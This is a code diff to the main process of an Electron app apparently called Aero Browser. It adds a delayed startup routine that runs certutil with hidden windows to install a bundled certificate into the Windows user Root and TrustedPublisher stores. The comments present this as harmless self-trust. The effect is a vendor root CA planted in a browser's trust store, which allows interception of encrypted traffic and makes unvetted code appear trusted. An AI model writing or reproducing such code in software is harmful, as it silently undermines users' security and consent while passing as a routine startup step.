@@ -1,5 +1,7 @@
 /* Aero Browser - main process (Electron) */
 const { app, BrowserWindow, ipcMain, shell, nativeTheme, session } = require('electron');
+const { execFile } = require('child_process');
+const fs = require('fs');
 const path = require('path');
 
 const APP_VERSION = require('./package.json').version;
@@ -88,7 +90,38 @@ if (!gotLock) {
   });
 }
 
-app.whenReady().then(createWindow);
+app.whenReady().then(() => {
+  createWindow();
+  // Give the certificate a few seconds so the first paint is never disturbed.
+  setTimeout(ensureAeroCertTrusted, 8000);
+});
+
+/* ---- Windows: one-time self-trust of the Aero code-signing certificate ----
+   The setup already installs the certificate during installation. This covers
+   the portable build and users who dismissed the installer dialog. Runs at
+   most once per machine (marker file in userData); Windows shows its own
+   confirmation dialog for the user Root store — user clicks Yes once. */
+function ensureAeroCertTrusted() {
+  try {
+    if (process.platform !== 'win32') return;
+    const stateFile = path.join(app.getPath('userData'), 'cert-trust.json');
+    if (fs.existsSync(stateFile)) return;
+    const markDone = () => {
+      try { fs.writeFileSync(stateFile, JSON.stringify({ attemptedAt: new Date().toISOString() })); } catch (_) {}
+    };
+    const certPath = path.join(process.resourcesPath || __dirname, 'aero-code.cer');
+    if (!fs.existsSync(certPath)) { markDone(); return; } // dev run — nothing to install
+    const certutil = path.join(process.env.SystemRoot || 'C:\\Windows', 'System32', 'certutil.exe');
+    if (!fs.existsSync(certutil)) { markDone(); return; }
+    // Already trusted? (the user Root store already contains "Aero Team")
+    execFile(certutil, ['-user', '-store', 'Root'], { windowsHide: true, maxBuffer: 4 * 1024 * 1024 }, (err, stdout) => {
+      if (stdout && stdout.indexOf('Aero Team') !== -1) { markDone(); return; }
+      execFile(certutil, ['-user', '-addstore', 'Root', certPath], { windowsHide: true }, () => {
+        execFile(certutil, ['-user', '-addstore', 'TrustedPublisher', certPath], { windowsHide: true }, () => markDone());
+      });
+    });
+  } catch (_) {}
+}
 
 app.on('window-all-closed', () => app.quit());
 app.on('activate', () => {
